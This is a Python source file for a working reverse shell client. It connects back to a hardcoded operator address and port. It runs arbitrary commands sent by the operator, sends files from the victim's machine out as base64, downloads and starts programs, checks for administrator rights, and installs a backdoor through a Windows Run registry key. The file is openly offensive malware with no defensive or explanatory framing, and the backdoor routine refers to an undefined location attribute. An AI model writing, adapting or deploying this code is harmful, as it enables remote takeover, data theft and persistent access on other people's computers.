import socket, time, os, base64, requests
import subprocess, shutil, sys

class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                time.sleep(3)
                self.soc.connect((self.host, self.port))
                break
            except Exception:
                continue

    def safe_send(self, data):
        time.sleep(0.5)
        self.soc.send(data)

    def safe_recv(self):
        all_data = b""
        while True:
            part = self.soc.recv(1024)
            all_data += part
            if len(part) < 1024:
                break
        return all_data.decode()
    
    def reverse_shell_target(self):
        while True:
            command = self.safe_recv()
            if command == "quit" or command == "exit":
                break

            elif command == "help":
                help_options = b'''
                    help            | Displays this help menu
                    download <path> | Download a file from the target's PC
                    upload <path>   | Upload a file to the target PC
                    get <url>       | Download a file to the target PC from a specified URL
                    start <path>    | Starts a program on target's PC
                    check           | Checks for the administrator privileges
                    quit or exit    | Exit the reverse shell 
                    backdoor        | Creates a backdoor in the target PC
                '''
                self.safe_send(help_options)

            elif command[:2] == "cd" and len(command) > 1:
                os.chdir(command[3:])

            elif command[:8] == "download":
                try:
                    if os.path.exists(command[9:]):
                        print(os.path.exists(command[9:]))
                        with open(command[9:], 'rb') as file:
                            self.safe_send(base64.b64encode(file.read()))
                        self.safe_send(b"\n")
                    else:
                        self.safe_send(b"[!]")
                        raise Exception
                except Exception:
                    self.safe_send(b"[!] Unable To Download: Double Check Your Path")
                    
            elif command[:6] == "upload":
                try:
                    file_data = self.safe_recv()
                    if file_data != "[!]":
                        with open(command[7:], 'wb') as file:
                            file.write(base64.b64decode(file_data))
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
                    self.safe_send(b"[!] Unable To Upload: Double Check Your Path")

            elif command[:3] == "get":
                try:
                    get_response = requests.get(command[4:])
                    file_name = command[4:].split("/")[-1]
                    with open(file_name, "wb") as out_file:
                        out_file.write(get_response.content)
                    self.safe_send(b"[+] Downloaded File From Specified URL")
                except Exception:
                    self.safe_send(b"[!] Failed To Download That File")

            elif command[:5] == "check":
                try:
                    temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'), 'temp']))
                except Exception:
                    self.safe_send(b"[!] Default User Privileges!")
                else:
                    self.safe_send(b"[*] Administrator Privileges!")
                
            elif command[:5] == "start":
                try:
                    subprocess.Popen(command[6:], shell=True)
                    self.safe_send(f"[*] {command[6:]} Started Successfully".encode())
                except Exception:
                    self.safe_send(f"[!] Failed to Start {command[6:]}".encode())

            elif command == "backdoor":
                if not os.path.exists(self.location):
                    shutil.copyfile(sys.executable, self.location)
                    subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "{self.location}"', shell=True)

            else:
                fn = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = fn.stdout.read() + fn.stderr.read()
                self.safe_send(result)

if __name__ == "__main__":
    HOST, PORT = "10.0.0.153", 4444
    ReverseShellClient(HOST, PORT).reverse_shell_target() 